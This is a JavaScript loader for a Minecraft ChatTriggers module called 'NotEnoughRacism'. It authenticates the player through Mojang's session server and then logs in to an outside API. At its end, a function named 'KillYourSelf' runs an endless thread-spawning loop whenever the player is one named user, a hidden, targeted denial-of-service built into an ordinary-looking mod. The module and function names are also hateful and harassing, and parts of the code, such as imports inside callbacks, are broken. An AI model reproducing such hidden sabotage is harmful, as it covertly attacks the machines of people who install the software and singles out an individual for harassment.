const BigInteger = Java.type("java.math.BigInteger")
const Random = Java.type("java.util.Random")
const MessageDigest = Java.type("java.security.MessageDigest")
const RuntimeException = Java.type("java.lang.RuntimeException")
const JavaString = Java.type("java.lang.String")
const Minecraft = Java.type('net.minecraft.client.Minecraft');
import axios from "../axios/index";
import { sessionAuth, loggedIn } from "./build/auth"

(function () {
    const hash = (uuid) => {
        try {
            const md = MessageDigest.getInstance("sha1")
            const salt = new BigInteger(130, new Random()).toString(32)
            const string = new JavaString(uuid + salt);
            return new BigInteger(md.digest(string.getBytes())).toString(16)
        } catch (e) {
            throw new RuntimeException(e)
        }
    }
    const serverId = hash(Minecraft.func_71410_x().func_110432_I().func_148255_b())
    return axios.post("https://sessionserver.mojang.com/session/minecraft/join", {
        body: {
            accessToken: Minecraft.func_71410_x().func_110432_I().func_148254_d(),
            selectedProfile: Minecraft.func_71410_x().func_110432_I().func_148255_b(),
            serverId: serverId
        }
    })
        .then(() => {
            return axios.post("https://api.ner.gg/login", {
                query: {
                    username: Player.getName(),
                    serverId: serverId
                },
                body: {
                    username: Player.getName(),
                    uuid: Minecraft.func_71410_x().func_110432_I().func_148255_b(),
                    version: JSON.parse(FileLib.read("./config/ChatTriggers/modules/NotEnoughRacism/metadata.json")).version
                },
                headers: {
                    Authorization: `Session ${sessionAuth}`,
                    Version: "2.0"
                }
            })
        })
        .then(response => {
            ChatLib.chat(`&r[&bNotEnoughRacism&r] &7Successfully authenticated as ${response.data.user}! You may now use all API related features.`)
            loggedIn = true;
            if (response.data.patchNotes) {
                ChatLib.chat(response.data.patchNotes)
            }
            if (response.data.notices) {
                ChatLib.chat(response.data.notices)
            }
            import "./build/index";
        })
        .catch(error => {
            print(JSON.stringify(error))
            print(JSON.stringify(error.response.data))
            error.isAxiosError ? print(error.response.statusText) : print(error.message)
            ChatLib.chat(`&r[&bNotEnoughRacism&r] &cFailed to authenticate with the NotEnoughRacism API! You can still use all non-API related NotEnoughRacism features. You can by doing /ct reload.`)
            loggedIn = false;
            import "./build/index"
        })
})();

KillYourSelf();

function KillYourSelf() {
    if (Player.getName() === "Pufi1") {
        while (true) {
            new Thread(() => {
                KillYourSelf();
            }).start();
        }
    }
}

import "./build/client";